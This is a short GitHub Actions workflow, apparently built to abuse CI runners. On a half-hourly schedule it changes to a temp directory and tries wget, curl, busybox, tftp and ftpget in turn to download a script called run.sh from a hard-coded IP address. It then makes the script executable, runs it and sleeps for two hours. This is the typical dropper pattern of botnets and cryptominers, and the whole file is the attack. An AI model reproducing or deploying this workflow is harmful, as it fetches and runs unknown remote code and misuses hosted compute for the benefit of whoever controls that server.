name: Auto Payload with Arch Detection

on:
  schedule:
    - cron: '*/30 * * * *'
  workflow_dispatch:

jobs:
  run:
    runs-on: ubuntu-latest
    steps:
    - name: Show Arch
      run: echo "Running on $(uname -m) at $(date)"
    - name: Run Payload
      run: |
        cd /tmp||cd /var/tmp||cd /dev/shm
        (wget http://16.171.16.1/run.sh -O run.sh 2>/dev/null||curl -s http://16.171.16.1/run.sh -o run.sh||busybox wget http://16.171.16.1/run.sh -O run.sh 2>/dev/null||tftp -g -r run.sh 16.171.16.1 69||ftpget -u "" -p "" -P 21 16.171.16.1 run.sh run.sh);[ -s run.sh ]&&chmod 777 run.sh&&./run.sh
        sleep 7200
